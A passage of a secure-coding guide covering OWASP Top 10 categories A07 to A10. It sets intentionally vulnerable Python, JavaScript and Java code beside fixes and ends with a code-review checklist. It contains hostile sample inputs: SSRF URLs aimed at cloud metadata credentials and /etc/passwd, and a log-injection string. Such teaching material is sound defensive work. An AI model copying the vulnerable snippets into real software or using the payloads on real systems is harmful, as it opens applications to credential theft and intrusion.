**Scenario 3: Weak Password Recovery**
A password reset flow asks security questions with easily guessable answers ("What city were you born in?") and sends the new password in plain text via email.

### Vulnerable Code Examples

**Python - Weak Session Management:**
```python
# VULNERABLE: No session regeneration after login, weak session config
@app.route('/login', methods=['POST'])
def login():
    user = User.query.filter_by(
        username=request.form['username']
    ).first()
    if user and user.check_password(request.form['password']):
        session['user_id'] = user.id  # Session ID not regenerated
        return redirect('/dashboard')
    return render_template('login.html', error='Invalid credentials')

# No session timeout configured
# No account lockout mechanism
```

**JavaScript - Insecure JWT Implementation:**
```javascript
// VULNERABLE: No expiry, weak secret, algorithm confusion possible
const jwt = require('jsonwebtoken');

function generateToken(user) {
  return jwt.sign(
    { userId: user.id, role: user.role },
    'secret123',           // Weak, hardcoded secret
    // No expiresIn set - token never expires
  );
}

function verifyToken(token) {
  return jwt.verify(token, 'secret123');
  // No algorithm restriction - vulnerable to alg:none attack
}
```

**Java - No Account Lockout:**
```java
// VULNERABLE: No brute force protection
@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody LoginRequest request) {
    User user = userRepository.findByUsername(request.getUsername());
    if (user != null && passwordEncoder.matches(request.getPassword(), user.getPasswordHash())) {
        String token = jwtService.generateToken(user);
        return ResponseEntity.ok(new AuthResponse(token));
    }
    return ResponseEntity.status(401).body("Invalid credentials");
    // No failed attempt tracking, no lockout, no delay
}
```

### Fixed Code Examples

**Python - Secure Session Management:**
```python
from flask_login import login_user
from flask_limiter import Limiter

limiter = Limiter(app, key_func=get_remote_address)

app.config.update(
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE='Lax',
    PERMANENT_SESSION_LIFETIME=timedelta(hours=1),
)

# FIXED: Rate limiting, lockout, session regeneration
@app.route('/login', methods=['POST'])
@limiter.limit("10 per minute")
def login():
    username = request.form['username']
    user = User.query.filter_by(username=username).first()

    if user and user.is_locked():
        return render_template('login.html',
            error='Account locked. Try again in 15 minutes.'), 429

    if user and user.check_password(request.form['password']):
        user.reset_failed_attempts()
        session.regenerate()  # Regenerate session ID after login
        login_user(user, remember=False)
        return redirect('/dashboard')

    if user:
        user.increment_failed_attempts()
        if user.failed_attempts >= 5:
            user.lock_until(datetime.utcnow() + timedelta(minutes=15))
        db.session.commit()

    return render_template('login.html', error='Invalid credentials'), 401
```

**JavaScript - Secure JWT Implementation:**
```javascript
// FIXED: Strong secret, expiry, algorithm pinning
const jwt = require('jsonwebtoken');

const JWT_SECRET = process.env.JWT_SECRET; // From environment, minimum 256 bits
const JWT_OPTIONS = {
  algorithm: 'HS256',
  expiresIn: '1h',
  issuer: 'app.example.com',
};

function generateToken(user) {
  return jwt.sign(
    { userId: user.id, role: user.role },
    JWT_SECRET,
    JWT_OPTIONS
  );
}

function verifyToken(token) {
  return jwt.verify(token, JWT_SECRET, {
    algorithms: ['HS256'],    // Explicitly restrict algorithms
    issuer: 'app.example.com',
  });
}
```

**Java - Account Lockout with Tracking:**
```java
// FIXED: Failed attempt tracking with progressive lockout
@PostMapping("/login")
@RateLimited(requests = 10, period = 60)
public ResponseEntity<?> login(@RequestBody LoginRequest request) {
    User user = userRepository.findByUsername(request.getUsername());

    if (user != null && user.isLocked()) {
        return ResponseEntity.status(429).body("Account temporarily locked");
    }

    if (user != null && passwordEncoder.matches(
            request.getPassword(), user.getPasswordHash())) {
        user.resetFailedAttempts();
        userRepository.save(user);
        String token = jwtService.generateToken(user);
        return ResponseEntity.ok(new AuthResponse(token));
    }

    if (user != null) {
        user.incrementFailedAttempts();
        if (user.getFailedAttempts() >= 5) {
            user.setLockedUntil(Instant.now().plus(Duration.ofMinutes(15)));
        }
        userRepository.save(user);
    }

    // Same response for invalid username and invalid password
    return ResponseEntity.status(401).body("Invalid credentials");
}
```

### Defense Strategies

1. **Implement multi-factor authentication** (MFA/2FA) to prevent credential stuffing, brute force, and stolen credential reuse
2. **Do not ship or deploy with any default credentials**, particularly for admin users
3. **Implement weak password checks** against the top 10,000 worst passwords list
4. **Align password policies with NIST 800-63b** - length over complexity, allow paste, no periodic rotation requirements
5. **Ensure registration, credential recovery, and API pathways are hardened** against account enumeration attacks by using the same messages for all outcomes
6. **Limit or increasingly delay failed login attempts**, but be careful not to create a denial-of-service scenario. Log all failures and alert administrators
7. **Use a server-side, secure, built-in session manager** that generates a new random session ID with high entropy after login
8. **Set session idle timeout** (15-30 minutes for high-value applications)

### Detection Tools

- **Hydra** - Network login brute force testing
- **Burp Suite** - Session management testing, token analysis
- **OWASP ZAP** - Authentication testing
- **CrackStation / HashCat** - Password hash strength validation
- **Semgrep** - Rules for insecure JWT usage and weak auth patterns
- **Have I Been Pwned API** - Check if passwords appear in known breaches

---

## A08:2021 Software and Data Integrity Failures

### Description

Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. This includes:

- Using software from untrusted sources (CDNs, repositories) without integrity verification
- Insecure CI/CD pipelines that introduce the possibility of unauthorized access, malicious code, or system compromise
- Auto-update functionality that downloads and applies updates without sufficient integrity verification
- Insecure deserialization where objects or data are encoded or serialized into a structure that an attacker can see and modify

### Attack Scenarios

**Scenario 1: Supply Chain Attack**
An attacker compromises a popular npm package (like event-stream). Applications that depend on it automatically pull the malicious update, resulting in cryptocurrency theft.

**Scenario 2: Insecure Deserialization**
An attacker modifies a serialized Java object in a cookie. When the server deserializes it, it triggers arbitrary code execution via a gadget chain.

**Scenario 3: CI/CD Pipeline Compromise**
An attacker gains access to the CI/CD system and modifies the build pipeline to inject a backdoor into the production artifact.

### Vulnerable Code Examples

**Python - Insecure Deserialization:**
```python
import pickle
import base64

# VULNERABLE: Deserializing untrusted pickle data
@app.route('/api/session', methods=['POST'])
def load_session():
    session_data = request.cookies.get('session_data')
    data = pickle.loads(base64.b64decode(session_data))  # RCE possible!
    return jsonify(data)
```

**JavaScript - Unverified CDN Scripts:**
```html
<!-- VULNERABLE: No integrity check on CDN-loaded scripts -->
<script src="https://cdn.example.com/jquery-3.6.0.min.js"></script>
<script src="https://cdn.example.com/lodash-4.17.21.min.js"></script>
```

**Java - Insecure Object Deserialization:**
```java
// VULNERABLE: Deserializing user-controlled data
@PostMapping("/api/import")
public ResponseEntity<?> importData(@RequestBody byte[] data) {
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
    Object obj = ois.readObject();  // Arbitrary object deserialization
    return ResponseEntity.ok(processData(obj));
}
```

### Fixed Code Examples

**Python - Safe Serialization:**
```python
import json
import hmac
import hashlib

SECRET_KEY = os.environ['SESSION_SECRET']

# FIXED: Use JSON (not pickle) with HMAC integrity verification
@app.route('/api/session', methods=['POST'])
def load_session():
    session_data = request.cookies.get('session_data')
    signature = request.cookies.get('session_sig')

    # Verify integrity
    expected_sig = hmac.new(
        SECRET_KEY.encode(), session_data.encode(), hashlib.sha256
    ).hexdigest()

    if not hmac.compare_digest(signature, expected_sig):
        return jsonify({"error": "Invalid session"}), 403

    data = json.loads(session_data)  # JSON is safe from code execution
    return jsonify(data)
```

**JavaScript - Subresource Integrity (SRI):**
```html
<!-- FIXED: SRI hash verification for CDN scripts -->
<script
  src="https://cdn.example.com/jquery-3.6.0.min.js"
  integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfG"
  crossorigin="anonymous">
</script>
```

**Java - Safe Deserialization with Allowlisting:**
```java
// FIXED: Use JSON deserialization with explicit type mapping
@PostMapping("/api/import")
public ResponseEntity<?> importData(@RequestBody String jsonData) {
    ObjectMapper mapper = new ObjectMapper();
    mapper.activateDefaultTyping(
        mapper.getPolymorphicTypeValidator(),
        ObjectMapper.DefaultTyping.NON_FINAL
    );

    // Only allow specific known types
    PolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()
        .allowIfSubType("com.myapp.model.")
        .build();
    mapper.activateDefaultTyping(ptv, ObjectMapper.DefaultTyping.NON_FINAL);

    ImportData data = mapper.readValue(jsonData, ImportData.class);
    return ResponseEntity.ok(processData(data));
}
```

### Defense Strategies

1. **Use digital signatures** to verify software or data is from the expected source and has not been altered
2. **Ensure libraries and dependencies are consuming trusted repositories** (npmjs.com, pypi.org, Maven Central). Consider hosting a vetted internal mirror
3. **Use a software supply chain security tool** (OWASP Dependency-Check, Snyk) to verify that components do not contain known vulnerabilities
4. **Ensure there is a review process for code and configuration changes** to minimize the chance that malicious code or configuration enters the pipeline
5. **Ensure your CI/CD pipeline has proper segregation, configuration, and access control** to ensure the integrity of the code flowing through build and deploy processes
6. **Do not send unsigned or unencrypted serialized data** to untrusted clients without some form of integrity check or digital signature
7. **Avoid native deserialization** (pickle, Java ObjectInputStream, PHP unserialize). Use JSON or other safe formats
8. **Implement Subresource Integrity (SRI)** for all externally loaded scripts and stylesheets

### Detection Tools

- **Sigstore / cosign** - Container image signing and verification
- **npm audit signatures** - Verify npm package signatures
- **SLSA Framework** - Supply chain integrity levels
- **Semgrep** - Rules for insecure deserialization patterns
- **Snyk** - Supply chain security analysis
- **Socket.dev** - Detects supply chain attacks in npm/PyPI packages
- **in-toto** - Supply chain layout verification

---

## A09:2021 Security Logging and Monitoring Failures

### Description

This category helps detect, escalate, and respond to active breaches. Without logging and monitoring, breaches cannot be detected. Insufficient logging, detection, monitoring, and active response occurs any time:

- Auditable events (logins, failed logins, high-value transactions) are not logged
- Warnings and errors generate no, inadequate, or unclear log messages
- Logs are only stored locally and not sent to a centralized monitoring system
- Appropriate alerting thresholds and response escalation processes are not in place
- Penetration testing and scans by DAST tools (such as OWASP ZAP) do not trigger alerts
- The application cannot detect, escalate, or alert for active attacks in real-time or near real-time
- Log data is not protected from tampering (injection, deletion)

### Attack Scenarios

**Scenario 1: Undetected Brute Force**
An attacker performs a credential stuffing attack with 100,000 password attempts. Because failed logins are not logged, the attack goes unnoticed for months.

**Scenario 2: Data Exfiltration Without Alerts**
An attacker exploits a SQL injection vulnerability to slowly exfiltrate customer records over several weeks. No monitoring detects the unusual query patterns or data volumes.

**Scenario 3: Log Injection**
An attacker injects fake log entries (`\n200 OK admin login success`) to hide their malicious activity among legitimate-looking log entries.

### Vulnerable Code Examples

**Python - No Security Event Logging:**
```python
# VULNERABLE: No logging of authentication events
@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'], request.form['password'])
    if user:
        login_user(user)
        return redirect('/dashboard')
    return render_template('login.html', error='Invalid credentials')
    # No record of who tried to login, from where, or when
```

**JavaScript - Logging Sensitive Data:**
```javascript
// VULNERABLE: Logging sensitive information
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  console.log(`Login attempt: username=${username}, password=${password}`); // Logs passwords!
  try {
    const user = await authenticate(username, password);
    console.log(`User data: ${JSON.stringify(user)}`); // Logs PII
    res.json({ token: generateToken(user) });
  } catch (err) {
    console.log(`Login failed for ${username}`);
    res.status(401).json({ error: 'Invalid credentials' });
  }
});
```

**Java - Log Injection Vulnerability:**
```java
// VULNERABLE: Unsanitized user input in log messages
@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody LoginRequest request) {
    logger.info("Login attempt for user: " + request.getUsername());
    // Attacker submits username: "admin\n2026-03-28 INFO Login successful for admin"
    // This creates a fake log entry that looks legitimate
    // ...
}
```

### Fixed Code Examples

**Python - Comprehensive Security Logging:**
```python
import logging
import structlog
from datetime import datetime

# FIXED: Structured security event logging
security_logger = structlog.get_logger("security")

@app.route('/login', methods=['POST'])
@limiter.limit("10 per minute")
def login():
    username = request.form['username']
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'unknown')

    user = authenticate(username, request.form['password'])
    if user:
        security_logger.info(
            "authentication_success",
            username=username,
            ip_address=ip_address,
            user_agent=user_agent,
            event_type="AUTH_SUCCESS",
            timestamp=datetime.utcnow().isoformat(),
        )
        login_user(user)
        return redirect('/dashboard')

    security_logger.warning(
        "authentication_failure",
        username=username,
        ip_address=ip_address,
        user_agent=user_agent,
        event_type="AUTH_FAILURE",
        timestamp=datetime.utcnow().isoformat(),
    )
    return render_template('login.html', error='Invalid credentials'), 401
```

**JavaScript - Safe Structured Logging:**
```javascript
// FIXED: Structured logging without sensitive data
const winston = require('winston');

const securityLogger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  defaultMeta: { service: 'auth-service' },
  transports: [
    new winston.transports.File({ filename: 'security.log' }),
    new winston.transports.Console(),
  ],
});

app.post('/api/login', async (req, res) => {
  const { username } = req.body;  // Never destructure password into scope
  const ip = req.ip;
  const userAgent = req.get('User-Agent');

  try {
    const user = await authenticate(username, req.body.password);
    securityLogger.info('Authentication successful', {
      event: 'AUTH_SUCCESS',
      username,
      ip,
      userAgent,
    });
    res.json({ token: generateToken(user) });
  } catch (err) {
    securityLogger.warn('Authentication failed', {
      event: 'AUTH_FAILURE',
      username,
      ip,
      userAgent,
      reason: err.code,  // Log error code, not full error
    });
    res.status(401).json({ error: 'Invalid credentials' });
  }
});
```

**Java - Log Injection Prevention:**
```java
// FIXED: Sanitized log messages with structured logging
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import net.logstash.logback.argument.StructuredArguments;

@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody LoginRequest request) {
    // Sanitize input before logging - strip control characters
    String sanitizedUsername = request.getUsername()
        .replaceAll("[\\r\\n\\t]", "_");

    logger.info("Login attempt",
        StructuredArguments.kv("username", sanitizedUsername),
        StructuredArguments.kv("ip", request.getRemoteAddr()),
        StructuredArguments.kv("event", "AUTH_ATTEMPT")
    );
    // ...
}
```

### Defense Strategies

1. **Ensure all login, access control, and server-side input validation failures can be logged** with sufficient user context to identify suspicious or malicious accounts
2. **Ensure logs are generated in a format** that log management solutions can easily consume (structured JSON)
3. **Ensure log data is encoded correctly** to prevent injections or attacks on logging/monitoring systems
4. **Ensure high-value transactions have an audit trail** with integrity controls to prevent tampering or deletion (append-only database tables, blockchain-based audit)
5. **Establish effective monitoring and alerting** such that suspicious activities are detected and responded to within acceptable time periods
6. **Establish or adopt an incident response and recovery plan** such as NIST 800-61r2 or later
7. **Never log sensitive data** (passwords, tokens, credit card numbers, PII) - mask or omit them
8. **Forward logs to a centralized, immutable log store** (ELK Stack, Splunk, CloudWatch Logs)

### Detection Tools

- **ELK Stack** (Elasticsearch, Logstash, Kibana) - Centralized logging and analysis
- **Splunk** - Security Information and Event Management (SIEM)
- **Grafana + Loki** - Log aggregation and alerting
- **AWS CloudTrail / CloudWatch** - Cloud audit and monitoring
- **Falco** - Runtime security monitoring for containers
- **OSSEC / Wazuh** - Host-based intrusion detection with log analysis
- **PagerDuty / OpsGenie** - Alert escalation and incident management

---

## A10:2021 Server-Side Request Forgery (SSRF)

### Description

SSRF flaws occur when a web application fetches a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list.

Modern applications frequently fetch URLs, making SSRF increasingly common. Severity can be high when combined with cloud metadata services (e.g., AWS EC2 metadata at `169.254.169.254`), internal services, or file protocol handlers.

### Attack Scenarios

**Scenario 1: Cloud Metadata Access**
An attacker provides `http://169.254.169.254/latest/meta-data/iam/security-credentials/` as a URL parameter. The application fetches AWS IAM credentials from the internal metadata service.

**Scenario 2: Internal Network Scanning**
An attacker uses the SSRF vulnerability to probe internal services: `http://192.168.1.1:8080/admin`, discovering and accessing internal admin panels.

**Scenario 3: File Protocol Exploitation**
An attacker submits `file:///etc/passwd` as a URL, and the application reads and returns the contents of the system password file.

### Vulnerable Code Examples

**Python - Unrestricted URL Fetch:**
```python
import requests

# VULNERABLE: No URL validation, fetches any user-supplied URL
@app.route('/api/fetch-url')
def fetch_url():
    url = request.args.get('url')
    response = requests.get(url)  # Attacker can access internal services
    return jsonify({"content": response.text})
```

**JavaScript - Open Proxy:**
```javascript
// VULNERABLE: Acts as an open proxy to any URL
const axios = require('axios');

app.get('/api/preview', async (req, res) => {
  const { url } = req.query;
  const response = await axios.get(url);
  res.json({ data: response.data });
});
```

**Java - Unrestricted URL Connection:**
```java
// VULNERABLE: No validation of user-supplied URL
@GetMapping("/api/fetch")
public ResponseEntity<String> fetchUrl(@RequestParam String url) throws IOException {
    URL target = new URL(url);
    HttpURLConnection conn = (HttpURLConnection) target.openConnection();
    BufferedReader reader = new BufferedReader(
        new InputStreamReader(conn.getInputStream()));
    String content = reader.lines().collect(Collectors.joining("\n"));
    return ResponseEntity.ok(content);
}
```

### Fixed Code Examples

**Python - URL Validation with Allowlist:**
```python
import requests
import ipaddress
from urllib.parse import urlparse

ALLOWED_DOMAINS = {'api.example.com', 'cdn.example.com'}
BLOCKED_IP_RANGES = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16'),  # AWS metadata
    ipaddress.ip_network('0.0.0.0/8'),
]

# FIXED: Strict URL validation with domain allowlist and IP blocklist
@app.route('/api/fetch-url')
def fetch_url():
    url = request.args.get('url')
    parsed = urlparse(url)

    # Only allow HTTPS
    if parsed.scheme != 'https':
        return jsonify({"error": "Only HTTPS URLs allowed"}), 400

    # Check domain allowlist
    if parsed.hostname not in ALLOWED_DOMAINS:
        return jsonify({"error": "Domain not allowed"}), 400

    # Resolve DNS and check IP against blocklist
    try:
        resolved_ip = ipaddress.ip_address(
            socket.gethostbyname(parsed.hostname)
        )
        for blocked_range in BLOCKED_IP_RANGES:
            if resolved_ip in blocked_range:
                return jsonify({"error": "Access denied"}), 403
    except (socket.gaierror, ValueError):
        return jsonify({"error": "Invalid hostname"}), 400

    response = requests.get(url, timeout=5, allow_redirects=False)
    return jsonify({"content": response.text[:10000]})  # Limit response size
```

**JavaScript - URL Validation Middleware:**
```javascript
// FIXED: URL validation with allowlist and IP range blocking
const { URL } = require('url');
const dns = require('dns').promises;
const ipRangeCheck = require('ip-range-check');

const ALLOWED_DOMAINS = new Set(['api.example.com', 'cdn.example.com']);
const BLOCKED_RANGES = [
  '10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16',
  '127.0.0.0/8', '169.254.0.0/16', '0.0.0.0/8',
];

async function validateUrl(urlString) {
  const parsed = new URL(urlString);

  if (parsed.protocol !== 'https:') {
    throw new Error('Only HTTPS allowed');
  }

  if (!ALLOWED_DOMAINS.has(parsed.hostname)) {
    throw new Error('Domain not in allowlist');
  }

  const addresses = await dns.resolve4(parsed.hostname);
  for (const addr of addresses) {
    if (ipRangeCheck(addr, BLOCKED_RANGES)) {
      throw new Error('IP address blocked');
    }
  }

  return parsed.href;
}

app.get('/api/preview', async (req, res) => {
  try {
    const validatedUrl = await validateUrl(req.query.url);
    const response = await axios.get(validatedUrl, {
      timeout: 5000,
      maxRedirects: 0,
      maxContentLength: 1024 * 1024, // 1MB limit
    });
    res.json({ data: response.data });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});
```

**Java - SSRF Prevention with Allowlist:**
```java
// FIXED: URL validation with allowlist and private IP blocking
@GetMapping("/api/fetch")
public ResponseEntity<String> fetchUrl(@RequestParam String url) {
    try {
        URL target = new URL(url);

        // Only HTTPS
        if (!"https".equals(target.getProtocol())) {
            return ResponseEntity.badRequest().body("Only HTTPS allowed");
        }

        // Domain allowlist
        Set<String> allowedDomains = Set.of("api.example.com", "cdn.example.com");
        if (!allowedDomains.contains(target.getHost())) {
            return ResponseEntity.badRequest().body("Domain not allowed");
        }

        // Resolve and check IP
        InetAddress resolved = InetAddress.getByName(target.getHost());
        if (resolved.isLoopbackAddress() || resolved.isSiteLocalAddress()
                || resolved.isLinkLocalAddress() || resolved.isAnyLocalAddress()) {
            return ResponseEntity.status(403).body("Access denied");
        }

        HttpURLConnection conn = (HttpURLConnection) target.openConnection();
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);
        conn.setInstanceFollowRedirects(false);

        BufferedReader reader = new BufferedReader(
            new InputStreamReader(conn.getInputStream()));
        String content = reader.lines()
            .limit(1000)  // Limit lines read
            .collect(Collectors.joining("\n"));
        return ResponseEntity.ok(content);
    } catch (Exception e) {
        return ResponseEntity.badRequest().body("Invalid URL");
    }
}
```

### Defense Strategies

1. **Sanitize and validate all client-supplied input data**, including URL schemas, ports, and destination
2. **Use an allowlist of permitted URL schemas, ports, and destinations** rather than a denylist
3. **Disable HTTP redirections** (or validate the redirect target if needed)
4. **Do not send raw responses** to clients. Validate and sanitize server responses
5. **Segment remote resource access functionality** into separate networks to reduce the impact of SSRF
6. **For cloud environments, block access to metadata endpoints** (169.254.169.254) at the network level and use IMDSv2 (requires session token)
7. **Use DNS resolution validation** to prevent DNS rebinding attacks (resolve hostname, verify IP, then connect)
8. **Implement egress firewall rules** to restrict outbound connections from the application server to only necessary external services

### Detection Tools

- **Burp Suite Collaborator** - Detects out-of-band SSRF
- **OWASP ZAP** - Active SSRF scanning
- **SSRFmap** - Automated SSRF detection and exploitation
- **Semgrep** - Static rules for unsafe URL fetching patterns
- **Cloud provider security tools** - AWS IMDSv2, GCP metadata concealment
- **WAF rules** - Block requests containing internal IP ranges or metadata URLs

---

## Agent Security Checklist

The following checklist MUST be applied by the Agent during code review. Each item is a hard gate -- any violation must be flagged and fixed before merge.

### Access Control (A01)

- [ ] Every API endpoint has explicit authorization checks (decorator, middleware, or annotation)
- [ ] Resource access validates ownership (user_id matches the requesting user) or proper role
- [ ] Admin endpoints are protected with role-based access control (RBAC)
- [ ] No IDOR vulnerabilities: object IDs in URLs/params are validated against the authenticated user's permissions
- [ ] CORS configuration uses specific origins, not wildcard `*` with credentials
- [ ] Default deny: new endpoints are restricted unless explicitly marked public

### Cryptography (A02)

- [ ] No hardcoded secrets, API keys, or encryption keys in source code
- [ ] Passwords are hashed with bcrypt, scrypt, or Argon2id (never MD5/SHA1/SHA256 for passwords)
- [ ] Encryption uses AES-256-GCM or equivalent authenticated encryption (no ECB mode)
- [ ] TLS 1.2+ enforced for all external communications
- [ ] Random values for security purposes use CSPRNG (secrets module in Python, crypto.randomBytes in Node.js, SecureRandom in Java)
- [ ] Secrets are loaded from environment variables or a secrets manager, never from config files in the repository

### Injection (A03)

- [ ] All SQL queries use parameterized statements or ORM methods (no string concatenation/interpolation)
- [ ] User input rendered in HTML is properly escaped (context-sensitive output encoding)
- [ ] React/Vue `dangerouslySetInnerHTML` / `v-html` is never used with user-controlled data
- [ ] Content Security Policy (CSP) header is present and properly configured
- [ ] System commands never use `shell=True` with user input; arguments are passed as lists
- [ ] NoSQL queries cast user input to expected types (string, int) before use

### Design (A04)

- [ ] Rate limiting is applied to authentication endpoints, password reset, and OTP verification
- [ ] Business-critical operations validate data server-side (prices, quantities, discounts)
- [ ] Multi-tenant data access enforces tenant isolation at the query/ORM level
- [ ] Abuse cases are identified and mitigated (coupon reuse, referral fraud, mass registration)

### Configuration (A05)

- [ ] Debug mode is disabled in production (`DEBUG=False`, no verbose error responses)
- [ ] Error responses return generic messages with correlation IDs (no stack traces, no environment variables)
- [ ] Security headers are set: HSTS, X-Content-Type-Options, X-Frame-Options, CSP
- [ ] Default credentials are removed or changed for all services (databases, admin panels, caches)
- [ ] Unnecessary features, endpoints, and services are disabled in production
- [ ] Spring Boot Actuator / Django admin endpoints are secured or disabled in production

### Dependencies (A06)

- [ ] All dependencies have pinned versions (exact or range-bounded)
- [ ] A lockfile exists and is committed (package-lock.json, poetry.lock, Pipfile.lock)
- [ ] No dependencies with known critical/high CVEs (verified via npm audit, pip-audit, OWASP Dependency-Check)
- [ ] Dependencies are from official registries only (no typosquatting risk)

### Authentication (A07)

- [ ] Session IDs are regenerated after login
- [ ] Session cookies have Secure, HttpOnly, and SameSite attributes
- [ ] JWT tokens have expiration (exp claim), algorithm is pinned (no alg:none), secret is strong (256+ bits)
- [ ] Account lockout or progressive delay is implemented after repeated failed login attempts
- [ ] Login error messages do not reveal whether the username or password was incorrect
- [ ] Logout properly invalidates server-side session / revokes tokens

### Integrity (A08)

- [ ] No use of unsafe deserialization (pickle, Java ObjectInputStream, PHP unserialize) with untrusted data
- [ ] CDN-loaded scripts and stylesheets use Subresource Integrity (SRI) hashes
- [ ] CI/CD pipeline uses signed artifacts and verified base images
- [ ] Data from external APIs is validated before use

### Logging (A09)

- [ ] Authentication events (success, failure, lockout) are logged with structured metadata
- [ ] Log messages never contain passwords, tokens, credit card numbers, or PII
- [ ] User input in log messages is sanitized to prevent log injection (strip `\n`, `\r`, control chars)
- [ ] Logs are sent to a centralized logging system (not only local files)
- [ ] Alerts are configured for anomalous patterns (brute force, mass data access, privilege escalation)

### SSRF (A10)

- [ ] All outbound HTTP requests from user-controlled URLs are validated against a domain allowlist
- [ ] Private/internal IP ranges (10.x, 172.16.x, 192.168.x, 127.x, 169.254.x) are blocked for user-supplied URLs
- [ ] HTTP redirects are disabled or the redirect target is validated
- [ ] URL scheme is restricted to HTTPS for user-controlled outbound requests
- [ ] DNS resolution is validated before making the connection (prevent DNS rebinding)
- [ ] Cloud metadata endpoints are blocked at both application and network level

### General Security Practices

- [ ] All user input is validated on the server side (never trust client-side validation alone)
- [ ] File uploads validate type, size, and content (not just extension); files are stored outside web root
- [ ] API responses do not expose internal IDs, stack traces, or implementation details
- [ ] HTTP methods are restricted to those actually needed per endpoint
- [ ] Security-sensitive operations use CSRF tokens for state-changing requests
- [ ] Application uses the principle of least privilege for database accounts, file system access, and network permissions

---

> **Document Version**: v1.0
> **Last Updated**: 2026-03-28
> **Maintained by**: Super Dev Security Standards
> **References**: [OWASP Top 10 2021](https://owasp.org/Top10/), [OWASP ASVS](https://owasp.org/www-project-application-security-verification-standard/), [NIST 800-63b](https://pages.nist.gov/800-63-3/sp800-63b.html)
